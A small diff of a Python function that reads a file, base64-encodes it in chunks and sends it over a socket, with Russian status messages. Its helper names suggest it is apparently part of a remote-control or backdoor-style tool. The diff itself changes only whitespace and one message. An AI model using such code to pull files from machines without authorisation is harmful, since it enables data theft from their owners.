@@ -111,16 +111,16 @@ def upload(sock, file_name):
     try:
         with open(file_name, "rb") as file:
             while True:
-                chunk = file.read(1024)  
+                chunk = file.read(1024)
                 if not chunk:  
                     break
                 reliable_send(base64.b64encode(chunk).decode(), sock)
-        reliable_send("EOF", sock)  
-        reliable_send("[+] Файл успешно отправлен", sock)
+        reliable_send("EOF", sock) 
     except FileNotFoundError:
         reliable_send("[!!] Файл не найден", sock)
     except Exception as e:
         reliable_send(f"[!!] Ошибка: {e}", sock)
+
 
 
 
